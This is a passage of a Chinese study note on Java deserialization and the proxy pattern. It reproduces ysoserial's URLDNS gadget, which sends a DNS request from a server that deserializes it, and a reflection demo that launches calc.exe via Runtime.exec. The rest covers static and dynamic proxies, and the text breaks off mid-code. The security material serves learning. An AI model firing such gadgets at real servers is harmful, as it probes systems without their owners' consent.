URL.hashCode 的默认状态,下一次调用 url.hashCode() 时，会重新计算并触发 DNS 解析</span><br>hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure>
+
+<p>序列化的过程就不会 DNS 解析：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png" srcset="/img/loading.gif" lazyload></p>
+<p>只有反序列化的时候触发 DNS 解析：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="学习-ysoserial-中的-URLDNS："><a href="#学习-ysoserial-中的-URLDNS：" class="headerlink" title="学习 ysoserial 中的 URLDNS："></a>学习 ysoserial 中的 URLDNS：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//避免提前解析</span><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-comment">//创建 HashMap + URL</span><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                <span class="hljs-comment">//重置 URL 的缓存 hashCode</span><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>ysoserial 为了避免第一次序列化时就发起 DNS 请求，它使用了 SilentURLStreamHandler() 内部类自定义了 handler ，覆盖原来的 URL.hashCode.<font style="color:#080808;background-color:#ffffff;">handler，当第一次请求时，进入 SilentURLStreamHandler.getHostAddress  和  SilentURLStreamHandler.openConnection  ，都返回 null ，避免 DNS 请求和访问网络。这样在创建 payload 的阶段就不会触发 DNS ，而反序列化时，hashCode &#x3D;&#x3D; -1，触发原本的 getHostAddress 触发 DNS 请求。</font></p>
+<h2 id="2-4-利用-Runtime"><a href="#2-4-利用-Runtime" class="headerlink" title="2.4 利用 Runtime"></a>2.4 利用 Runtime</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo01;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-comment">// 1. 获取 Runtime 类</span><br>        Class&lt;?&gt; runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 2. 获取 getRuntime() 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><br>        <span class="hljs-comment">// 3. 调用 getRuntime() 获取 Runtime 对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 4. 获取 exec(String) 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br>        <span class="hljs-comment">// 5. 调用 exec() 执行 calc.exe</span><br>        execMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="3、JDK-动态代理"><a href="#3、JDK-动态代理" class="headerlink" title="3、JDK 动态代理"></a>3、JDK 动态代理</h1><p>参考文章：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#nIfNv">代理模式(狂神)</a></p>
+<p><font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p>
+</blockquote>
+<p><strong>代理模式即 SpringAOP 的底层</strong></p>
+<p><strong>代理模式分为静态代理和动态代理</strong></p>
+<p>原型：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png" srcset="/img/loading.gif" lazyload> </p>
+<h2 id="3-1-静态代理"><a href="#3-1-静态代理" class="headerlink" title="3.1 静态代理"></a>3.1 <strong>静态代理</strong></h2><p>角色分析：</p>
+<ul>
+<li>抽象角色 ： 一般会使用接口或者抽象类来解决</li>
+<li>真实角色 ：被代理角色</li>
+<li>代理角色 ：代理真实角色，</li>
+<li>客户 ：访问代理对象的人</li>
+</ul>
+<p>代理模式的好处：</p>
+<ul>
+<li>可以使真实角色的操作更加纯粹，不用关注一些公共的业务</li>
+<li>公共也交给代理角色，实现了业务的分工</li>
+<li>公共业务发生扩展的时候，方便集中管理</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//房东要租房子</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理，中介帮房东租房子，但是代理会有一些附属操作</span><br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);<br>        <span class="hljs-comment">//你不用面对房东，直接找中介租房子</span><br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-keyword">private</span> Host  host;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span> &#123;<br>        <span class="hljs-built_in">this</span>.host = host;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        host.rent();<br>        seeHouse();<br>        fare();<br>        hetong();<br>    &#125;<br><br>    <span class="hljs-comment">//看房</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带你看房&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//收中介费</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介收取中介费&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//签租赁合同</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hetong</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介签租赁合同&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png" srcset="/img/loading.gif" lazyload></p>
+<p>另一例:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-comment">//真实对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;修改了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;add&quot;</span>);<br>        userService.add();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;delete&quot;</span>);<br>        userService.delete();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;update&quot;</span>);<br>        userService.update();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;query&quot;</span>);<br>        userService.query();<br>    &#125;<br><br>    <span class="hljs-comment">//日志方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Debug] 使用了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理类</span><br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();<br>        <span class="hljs-comment">//使用代理类实现日志功能！</span><br>        proxy.setUserService(userService);<br>        proxy.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><font style="color:rgb(255, 0, 0);">在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="3-2-动态代理"><a href="#3-2-动态代理" class="headerlink" title="3.2 动态代理"></a>3.2 动态代理</h2><ul>
+<li>动态代理和静态代理角色一样</li>
+<li>动态代理的代理类是动态生成的，不是我们直接写好的</li>
+<li>动态代理分为俩大类：基于接口的动态代理，基于类的动态代理<ul>
+<li>基于接口–JDK 动态代理</li>
+<li>基于类–cglib</li>
+<li>java 字节码实现：javasist</li>
+</ul>
+</li>
+</ul>
+<p><font style="color:#080808;background-color:#ffffff;">了解俩个类：</font></p>
+<ul>
+<li>Proxy：代理</li>
+<li><font style="color:#080808;background-color:#ffffff;">InvocationHandler：调用处理程序</font></li>
+</ul>
+<p><strong><font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">动态代理的好处</font></strong></p>
+<p><font style="color:rgba(0, 0, 0, 0.9);">静态代理有的它都有，静态代理没有的，它也有！</font></p>
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">公共的业务由代理来完成 . 实现了业务的分工 ,</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">公共业务发生扩展时变得更加集中和方便 .</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">一个动态代理 , 一般代理某一类业务</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">一个动态代理可以代理多个类，代理的是接口！</font></li>
+</ul>
+<p>案例一</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Rent rent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRent</span><span class="hljs-params">(Rent rent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rent = rent;<br>    &#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      rent.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> 